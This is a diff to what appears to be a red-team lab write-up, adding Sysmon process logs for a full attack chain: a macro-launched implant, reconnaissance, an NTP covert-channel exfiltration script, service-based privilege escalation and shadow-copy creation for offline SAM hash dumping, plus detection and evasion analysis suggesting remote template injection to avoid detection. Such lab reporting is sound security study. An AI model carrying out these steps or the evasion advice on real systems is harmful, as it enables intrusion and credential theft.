@@ -479,28 +479,108 @@ impacket-secretsdump -sam /home/kali/loot/SAM -system /home/kali/loot/SYSTEM -se
 The SAM database is encrypted with a boot key derived from the SYSTEM hive. Having these files allows complete offline decryption and extraction of all local account NTLM hashes without touching the live system or triggering any endpoint detection. These hashes can be used directly in pass-the-hash attacks or cracked offline to recover plaintext passwords. This demonstrates that SYSTEM-level access combined with shadow copy access results in full credential compromise of the host.
 
 ### Phase 5: Log Analysis
-**Sysmon Event ID 1 Findings:**
 
-**NOTE: Copy and paste your Sysmon logs into Claude and have it format it like the table below.**
+Sysmon v15.22 was installed on the target prior to all activity and configured to log process creation events (Event ID 1). Logs were exported from the target and downloaded to the C2 server for analysis:
 
-| Timestamp | Process | Parent | Command Line |
-| :--- | :--- | :--- | :--- |
-| 14:20:01 | `WINWORD.EXE` | `explorer.exe` | `C:\Users\jdoe\Desktop\Invoice.pdf` | 
-| 14:20:05 | `cmd.exe` | `WINWORD.EXE` | `cmd /c certutil -urlcache -split -f http://...` | 
-| 14:25:10 | `powershell.exe` | `explorer.exe` | `powershell -enc JABzAD0A...` |
-**Analysis:**
-The initial macro execution spawned `cmd.exe` from `WINWORD.EXE`, which is a strong indicator of compromise. However, the subsequent PowerShell execution was obfuscated and did not trigger standard AMSI logging due to a misconfigured policy.
+```cmd
+wevtutil epl Microsoft-Windows-Sysmon/Operational C:\temp\sysmon.evtx
+```
+ 
+```bash
+download C:\\temp\\sysmon.evtx /home/kali/loot/
+```
 
-## 3. Recommendations
-
-1.  Implement Application Control (WDAC) to prevent Office applications from spawning command interpreters.
-2.  Enable PowerShell Script Block Logging to capture encoded commands.
-3.  Patch the Print Spooler service or disable it if not required.
-
-Download logs to kali 
 <img width="815" height="184" alt="image" src="https://github.com/user-attachments/assets/a1a36d2a-e99c-4967-8d03-5c086b26f6c5" />
 
-
+## Sysmon Event ID 1 Findings
+ 
+**Phase 1 — Initial Access**
+ 
+| Timestamp (UTC) | Process | Parent | Command Line |
+|:---|:---|:---|:---|
+| 2026-10-06 23:29:20 | `WINWORD.EXE` | `explorer.exe` | `WINWORD.EXE /n "C:\Users\Apollo\Documents\Doc1.docx"` |
+| 2026-10-06 23:29:21 | `cmd.exe` | `WINWORD.EXE` | `cmd.exe /c "C:\Users\Apollo\Documents\launcher.exe"` |
+| 2026-10-06 23:29:22 | `launcher.exe` | `cmd.exe` | `C:\Users\Apollo\Documents\launcher.exe` |
+| 2026-10-06 23:30:11 | `cmd.exe` | `launcher.exe` | `C:\Windows\system32\cmd.exe` |
+ 
+**Phase 2 — Enumeration**
+ 
+| Timestamp (UTC) | Process | Parent | Command Line |
+|:---|:---|:---|:---|
+| 2026-10-06 23:35:04 | `cscript.exe` | `launcher.exe` | `cscript "" -d -p ""` |
+| 2026-10-06 23:35:06 | `pnputil.exe` | `launcher.exe` | `pnputil.exe /enum-drivers` |
+| 2026-10-06 23:35:07 | `powershell.exe` | `launcher.exe` | `powershell.exe -EncodedCommand JgAoAFsA...` |
+| 2026-10-06 23:36:58 | `cmd.exe` | `launcher.exe` | `cmd.exe /c C:\Users\Apollo\enum.bat` |
+| 2026-10-06 23:36:58 | `whoami.exe` | `cmd.exe` | `whoami /all` |
+| 2026-10-06 23:36:58 | `tasklist.exe` | `cmd.exe` | `tasklist /v` |
+| 2026-10-06 23:36:59 | `NETSTAT.EXE` | `cmd.exe` | `netstat -ano` |
+| 2026-10-06 23:36:59 | `sc.exe` | `cmd.exe` | `sc query` |
+| 2026-10-06 23:36:59 | `net.exe` | `cmd.exe` | `net user` |
+| 2026-10-06 23:36:59 | `net.exe` | `cmd.exe` | `net localgroup` |
+| 2026-10-06 23:36:59 | `net.exe` | `cmd.exe` | `net localgroup administrators` |
+| 2026-10-06 23:36:59 | `ipconfig.exe` | `cmd.exe` | `ipconfig /all` |
+| 2026-10-06 23:36:59 | `netsh.exe` | `cmd.exe` | `netsh advfirewall show allprofiles` |
+| 2026-10-06 23:36:59 | `ARP.EXE` | `cmd.exe` | `arp -a` |
+| 2026-10-06 23:36:59 | `net.exe` | `cmd.exe` | `net use` |
+| 2026-10-06 23:36:59 | `systeminfo.exe` | `cmd.exe` | `systeminfo` |
+| 2026-10-06 23:37:21 | `powershell.exe` | `cmd.exe` | `powershell -command "Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\loot.zip"` |
+ 
+**Phase 3 — Exfiltration**
+ 
+| Timestamp (UTC) | Process | Parent | Command Line |
+|:---|:---|:---|:---|
+| 2026-10-06 23:38:12 | `powershell.exe` | `cmd.exe` | `powershell -ExecutionPolicy Bypass -File C:\temp\udp_sender.ps1` |
+ 
+**Phase 4 — Privilege Escalation**
+ 
+| Timestamp (UTC) | Process | Parent | Command Line |
+|:---|:---|:---|:---|
+| 2026-10-06 23:41:34 | `icacls.exe` | `cmd.exe` (azrael) | `icacls C:\VulnService /grant Everyone:(OI)(CI)F` |
+| 2026-10-06 23:41:40 | `sc.exe` | `cmd.exe` (azrael) | `sc.exe create VulnSvc binPath= "C:\VulnService\service.exe" start= auto obj= LocalSystem` |
+| 2026-10-06 23:41:45 | `sc.exe` | `cmd.exe` (azrael) | `sc.exe sdset VulnSvc "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)..."` |
+| 2026-10-06 23:42:25 | `sc.exe` | `cmd.exe` (Apollo) | `sc.exe stop VulnSvc` |
+| 2026-10-06 23:42:30 | `sc.exe` | `cmd.exe` (Apollo) | `sc.exe start VulnSvc` |
+| 2026-10-06 23:42:30 | `service.exe` | `services.exe` | `C:\VulnService\service.exe` (NT AUTHORITY\SYSTEM) |
+| 2026-10-06 23:42:30 | `rundll32.exe` | `service.exe` | `rundll32.exe` (NT AUTHORITY\SYSTEM) |
+| 2026-10-06 23:43:02 | `cmd.exe` | `rundll32.exe` | `C:\Windows\system32\cmd.exe` (NT AUTHORITY\SYSTEM) |
+| 2026-10-06 23:43:05 | `powershell.exe` | `cmd.exe` (SYSTEM) | `powershell -command "(Get-WmiObject -List Win32_ShadowCopy).Create('C:\','ClientAccessible')"` |
+| 2026-10-06 23:43:11 | `VSSVC.exe` | `services.exe` | `C:\Windows\system32\vssvc.exe` |
+| 2026-10-06 23:43:15 | `vssadmin.exe` | `cmd.exe` (SYSTEM) | `vssadmin list shadows` |
+ 
+---
+ 
+## Detection Analysis
+ 
+| Process | Likely Detected | Reason |
+|:---|:---|:---|
+| `WINWORD.EXE` spawning `cmd.exe` | **Yes** | Office spawning a command interpreter is a high-confidence IOC flagged by most EDR and Sigma rules |
+| `launcher.exe` executing from `Documents\` | **Yes** | Unsigned executable with no version info dropped and run from a user profile directory triggers AV and application control |
+| `powershell.exe -EncodedCommand` from `launcher.exe` | **Yes** | Base64 encoded PowerShell spawned by an unsigned binary is a near-universal detection trigger |
+| `pnputil.exe /enum-drivers` from `launcher.exe` | **Possibly** | Driver enumeration from a non-standard parent is suspicious but less commonly detected than direct exploitation |
+| `enum.bat` spawning multiple recon tools | **Possibly** | Individual commands like `net user` and `whoami` are noisy but common enough that volume-based detection would be needed to flag them |
+| `powershell.exe -ExecutionPolicy Bypass` | **Yes** | ExecutionPolicy bypass is a known malicious indicator flagged by AMSI and Script Block Logging |
+| NTP exfiltration via `powershell.exe` | **Possibly** | PowerShell making outbound UDP/123 connections is anomalous — legitimate NTP originates from `svchost.exe`. Only EDR with process-to-port correlation would catch it; basic IDS would not |
+| `sc.exe stop/start VulnSvc` as standard user Apollo | **Yes** | Standard user stopping and starting a SYSTEM service is anomalous and flagged by behavioral detection rules |
+| `service.exe` spawned by `services.exe` as SYSTEM | **Possibly** | Unsigned binary with no version or company info spawned by `services.exe` would be flagged by application control policies |
+| WMI shadow copy creation as SYSTEM | **Possibly** | `Win32_ShadowCopy.Create` called from PowerShell is a known ransomware precursor behavior flagged by some EDR rules |
+ 
+---
+ 
+## Evasion Analysis
+ 
+**What likely went undetected:**
+ 
+- **NTP covert channel payload content** — The NTP packets were structurally valid at the packet level and indistinguishable from legitimate time synchronization traffic by signature-based IDS. Only behavioral analysis correlating the originating process (`powershell.exe`) to UDP port 123 would catch it.
+- **Meterpreter over reverse HTTPS** — C2 traffic was encapsulated in TLS on ports 14000/15000. Without SSL inspection these connections appear as generic HTTPS traffic. The high port numbers avoid standard port-based detection rules.
+- **enum.bat recon commands** — Individual commands such as `net user`, `arp -a`, and `ipconfig /all` are commonly run by legitimate users and administrators. Without correlation to the parent process chain (`launcher.exe → cmd.exe → net.exe`) they would not generate alerts in isolation.
+---
+ 
+## Detection Improvement
+ 
+**Suggested improvement:** Deploy PowerShell Script Block Logging (`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging`) combined with Constrained Language Mode. This would have captured the encoded Meterpreter staging commands and the NTP sender script in plaintext regardless of obfuscation, and would have prevented several PowerShell-based techniques from executing under a default AppLocker policy.
+ 
+**TTP change that would reduce detection:** Replacing the VBA macro with a template injection attack (`DOTM` remote template) would remove the `AutoOpen()` macro from the document entirely, significantly reducing static analysis detection by email gateways and AV engines that scan macro-enabled documents. The kill chain would still appear in Sysmon but the initial delivery vector would be much harder to detect pre-execution.
+ 
 # EXTRA 
 # Phase 4: LPE Vulnerability Scanning and Exploitation Attempts
 
